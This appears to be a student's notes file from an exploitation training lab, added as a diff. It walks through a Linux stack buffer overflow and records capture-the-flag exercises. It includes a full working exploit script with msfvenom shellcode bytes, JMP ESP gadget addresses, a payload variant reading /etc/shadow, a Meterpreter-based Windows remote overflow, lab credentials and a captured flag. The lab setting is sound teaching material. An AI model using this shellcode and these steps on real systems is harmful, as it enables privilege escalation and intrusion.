@@ -1,0 +1,300 @@
+#DAY 5 EXPLOITATION
+
+__________________________________________________________________________________________
+
+#Buffer Overflow common terms 
+
+	Heap Memory that can be allocated and deallocated
+
+	Stack A contiguous section of memory used for passing arguments
+
+	Registers Storage elements as close as possible to the central processing 			unit (CPU)
+
+	Instruction Pointer (IP) a.k.a Program Counter (PC), contains the address 			of next instruction to be executed
+
+	Stack Pointer (SP) Contains the address of the next available space on the 			stack
+
+	Base Pointer (BP) The base of the stack
+
+	Function Code that is separate from the main program that is often used to 			replace code the repeats in order to make the program smaller and 			more efficient
+
+	Shellcode The code that is executed once an exploit successfully takes 			advantage of a vulnerability
+	
+#Buffer Overflow Defenses
+
+    Non executable (NX) stack
+
+    Address Space Layout Randomization (ASLR)
+
+    Data Execution Prevention (DEP)
+
+    Stack Canaries
+
+   
+
+Technical Help
+
+#Utilizing tools such as:
+
+
+    IDA, GHIDRA
+
+    GDB(linux), MONA, IMMUNITY(windows)
+
+    BASH, PYTHON
+
+#GDB
+
+	pdisass
+-----------------------------------------------------------------------------------------
+
+#demo
+
+	firefox open ctf open up demos 
+	two ways to interact with program userinput or  pass arguements parameter
+	see which one works
+	for example commands like mv and cat need a parameters 
+	overflow by spamming it with alot of charcters 
+	segmentation fault indication overflowable 
+	use gdb to be sure <-- only on linux opps station 
+	gdb <func name>
+	enter
+	pdisass main <-- c program most likely 
+	green is a funcrion 
+	x86 ignore 
+	pdisass <func gethegoods> 
+	see red functions loook it up
+	call user input
+	get function is extremely vulnerable to buffer overrflow is function 	vulernable
+	make sure its highlighted in red many functions vulnerble 
+	
+	write script use wiremask.eu 200 len lin_what.py 
+	run <<< $(python lin_what.py) <-- run command <<< <-- user input one way 		or other triple or none triple for user run otput of code in gdp of 		func	
+	enter
+	hex value of eip
+	EIP: 0x31634130 ('0Ac1')
+	wiremask gives offset 62 <-- lives 62 bytes in 
+	change script overflow = "A" * 62 <-- 62 chnages for every program 
+	 eip = "B" * 4 <-- test to make sure control eip <-- so we can put stack 			point for our code 
+ 	print(overflow + eip)
+	run <<< $(python lin_what.py) <-- in gdb 
+	four BBBB confirm postove control 
+	
+	no pretty coloras for this step have control of eip
+	env - gdb func <--- gdb no colors good 
+	show env 
+	unset env LINES
+	unset env COLUMNS 
+	show env 
+	run
+	enter string
+	overflow it bunch of a's
+	info proc map <--- on adverary machine 
+	find the start of heap next start address AFTER HEAP 0xf7 should start
+	find end addr above stack ABOVE 
+	find /b 0xf7de1000,0xf7ffe000,0xff,0xe4 <-- ff jump e4 esp jump to stack 					pointer
+	find /b <start addr after heap>, <end addr before stack>,0xff,0xe4 
+	0xf7f6956b
+	0xf7f69633
+	0xf7f69a0b
+	0xf7f69c3b
+	0xf7f69ccb
+	press enter grab  at least five
+	
+	break in up pairs of bytes  in script 
+	0xf7 de 3b 59
+	###actual eip in reverse endian###
+ 	10 eip =\x59\x3b\xde\xf7"
+	##NOP sled for safety##
+	nop = "\x90" * 10
+	print(overflow + eip + nop)
+	
+	msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
+	buf =  b"" <--- in script 
+	buf += b"\xda\xcb\xb8\x60\x91\x5d\xc5\xd9\x74\x24\xf4\x5a"
+	buf += b"\x29\xc9\xb1\x0b\x31\x42\x19\x03\x42\x19\x83\xea"
+	buf += b"\xfc\x82\x64\x37\xce\x1a\x1e\x9a\xb6\xf2\x0d\x78"
+	buf += b"\xbe\xe5\x26\x51\xb3\x81\xb6\xc5\x1c\x33\xde\x7b"
+	buf += b"\xea\x50\x72\x6c\xeb\x96\x73\x6c\x83\xfe\x1c\x0d"
+	buf += b"\x06\x97\xe2\x9a\x8b\xee\x02\xe9\xac"
+	print(overflow + eip + nop + buf)
+	./func <<< $(python lin_what.py)
+	Enter a string: 
+	student
+	sudo ./func <<< $(python lin_what.py)
+	root 
+	simple commands instead of whoami get flag first
+	CMD="cat /etc/shadow" <--- run msfvenom new shellcode 
+	put command commented out in script to see what commadn gave shellcode 
+	
+	*which gdb* <---- has to have gdb on box for buffer overflow check each 		function 
+	copy asnd paste scp to get our buff.py on there machine put it in tmp 
+	
+	troubshooting 
+	
+		check syntax of script 
+		for nop sled no mroe then 25 
+		increment double nop sled
+		run msfvemon copy and paste again new shellcode 
+		some times regenate shellcode it happens 
+		change eip and chnage shellcode 
+		msfvenom -p linux/x86/exec CMD="<command>" -b "\x00" -f python
+		
+	take file build script send executbale back once you figure out it works  
+_______________________________________________________________________________________
+
+#script
+
+## EXACT AMOUNT OF BYTES REQUIRED TO CONTROL THE EIP####
+#overflow = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+
+overflow = "A" * 62 
+
+#### Test to confirm control of EIP ####
+#eip = "B" * 4 
+
+###actual eip in reverse endian###
+eip = "\x59\x3b\xde\xf7"
+'''
+0xf7 de 3b 59
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+0xf7f64aeb
+0xf7f64aff
+0xf7f64d6f
+0xf7f64f97
+0xf7f650cf
+'''
+
+##NOP sled for safety##
+
+nop = "\x90" * 10 
+
+
+#### Finally, shellcode ####
+### msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python ####
+buf =  b""
+buf += b"\xda\xcb\xb8\x60\x91\x5d\xc5\xd9\x74\x24\xf4\x5a"
+buf += b"\x29\xc9\xb1\x0b\x31\x42\x19\x03\x42\x19\x83\xea"
+buf += b"\xfc\x82\x64\x37\xce\x1a\x1e\x9a\xb6\xf2\x0d\x78"
+buf += b"\xbe\xe5\x26\x51\xb3\x81\xb6\xc5\x1c\x33\xde\x7b"
+buf += b"\xea\x50\x72\x6c\xeb\x96\x73\x6c\x83\xfe\x1c\x0d"
+buf += b"\x06\x97\xe2\x9a\x8b\xee\x02\xe9\xac"
+
+#### Print it all out ###
+print(overflow + eip + nop + buf)
+
+
+___________________________________________________________________________________
+
+#DAY 5 ACTIVITIES
+Scheme of Maneuver:
+>Jump Box
+->T1: 192.168.28.111 T1 comrade :: StudentWebExploitPassword 2222 Donovian_Webserver
+
+->T2: 192.168.28.105 T2 comrade :: StudentReconPassword 2222
+Donovian-Terminal
+
+>Jump Box
+->donovian_grey_host
+-->T3: 192.168.150.245 T3
+
+
+q1.VulnLin.exe
+You should receive you have hit the target correctly :) in return for your success.
+Get the binary to execute portions of the program that are not normally executed.
+What is GOT?
+ASLR?
+What is PIE?
+What do stack_cookies do? What is called upon failure?
+How are strings terminated?
+What is argv?
+File LinVuln.exe
+
+conenct to the box 
+find / -type f -iname "VulnLin.exe" 2>/dev/null
+/var/www/html/consulting/public_html/longTermStorage/VulnLin.exe
+scp suspect file to us e
+
+
+q2.SecureServerind.exe & essfunc.dll
+Task: Perform a remote buffer overflow on the vulnerable Windows executable from your Linux_analyst box. Gain a shell using exploit code Launch your remote exploit at the Donovian Windows target on 192.168.150.245 to gain initial access. Your flag is within the public documents .
+
+
+	i use the script winows_buff.py and only chnage the port and ip to access
+	a meterpreter session to the .245 i made a tunnel to that ip though
+	port 9999 so in the script the ip and port i was conenecting to was 
+	127.0.0.1 3001 
+	with my script ready i opened up msfconsole set ip up approirately 
+	look at day 5 buffer overflow on windows 
+	launch it took a couple tries adjusting the shellcode 
+	then once in meterpreter i went to users\public\documents 
+	use command shell to get an actual command prompt out of meterpreter 
+	type <filename> <-- get contents of file 
+	ncf9MEElFGbZA4O4ocfp
+
+q3.Enter the contents of /.secret/.verysecret.pdb as the flag
+
+What protections are compiled into the binary?
+
+Useful GDB commands:
+info registers
+info proc map
+find
+run
+break *0x00000000
+continue
+
+These are not all required commands, nor are you required to use GDB.
+
+	connect to .111
+	scp proxychains through dynamic tunnel
+	proxychains scp -P 2222 comrade@192.168.28.111:/.hidden/inventory.exe  .
+	check if suspect program how it runs asf for command user input 
+	check to see if overflow it  
+	Segmentation fault (core dumped) good sign
+	gdb <func>
+	pdisass main
+	pdisass gethegoods 
+	look buffer vulnarbale 
+	make script 
+	go to wiremask copy it 
+	run it gdb 
+	run <<< $(python lin_buffer.py)
+	0x63413563
+	offset 76
+	change script
+	very good
+	env - gdb <func>
+	show env
+	unset env LINES
+	unset env COLUMNS
+	show env <-- nothign no colors  
+	 find /b 0xf7de1000,0xf7ffe000,0xff,0xe4
+		0xf7de3b59
+	copy and paste at least five into script chnage little endian 
+	put nop chnage print statement
+	ran msfvenom stateent put buf in script and pritn statement got shellcode 
+	going to run it and see if the script works 
+	msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
+	 sudo ./inventory.exe <<< $(python lin_buffer.py)
+	works got root
+	copy script to adversary and made sure the function was in same directory 
+	now need to chnage script to that machines eip and run it to exploit the 
+	fucntion buffer overflow to get access to the file 
+	sscp the file script to tmp directory 
+	run eip steps to get the stack and heap info in the new script 
+	leave everyhting else 
+	 sudo ./inventory.exe <<< $(python ~/lin_buffer.py)
+	be ind irectory of .exe ands pecify paht of the script
+	
+q4.inventory2.exe
+Task: Perform a local buffer overflow on the vulnerable ELF on your Linux_analyst box. Gain a root shell as a standard user
+
+
+
+
+
+
+
